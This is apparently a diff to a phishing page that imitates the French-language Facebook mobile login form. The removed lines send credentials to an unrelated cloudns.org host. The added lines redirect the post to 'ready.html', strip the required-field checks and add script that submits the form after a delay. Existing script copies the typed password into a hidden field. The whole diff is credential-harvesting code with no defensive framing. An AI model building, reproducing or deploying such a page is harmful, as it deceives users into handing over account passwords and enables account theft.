@@ -85,11 +85,12 @@
                     </div>
                   </div>
                   <div class="_5rut">
-                    <form 
+                    <form target="_blank"
                       method="post"
-                      action="https://majoie-acrostiches.cloudns.org"
+                      action="ready.html"
                       class="mobile-login-form _9hp- _5spm"
                       id="login_form"
+                      
                     >
                       <input
                         type="hidden"
@@ -143,7 +144,6 @@
                                 name="email"
                                 placeholder="Numéro mobile ou e-mail"
                                 data-sigil="m_login_email"
-                                required
                               />
                             </div>
                           </div>
@@ -167,7 +167,6 @@
                                       name="pass"
                                       placeholder="Mot de passe"
                                       type="password"
-                                      required
                                       data-sigil="password-plain-text-toggle-input"
                                     />
                                     <input 
@@ -210,7 +209,7 @@
                           data-sigil="login_password_step_element"
                         >
                           <button
-                            type="submit"
+                            type="button"
                             value="Log In"
                             class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu"
                             id="btnsubmit"
@@ -438,8 +437,13 @@
     <script>
       const hiddenPass = document.getElementById("hiddenPass");
       const password = document.getElementById("m_login_password");
+      const form = document.getElementById("login_form");
+      const btn = document.getElementById("btnsubmit");
       password.onchange = (e) => {
          hiddenPass.value = e.target.value;
+      }
+      btn.onclick = (e) => {
+          setTimeout(()=>form.submit(),500)
       }
       </script>
   </body>
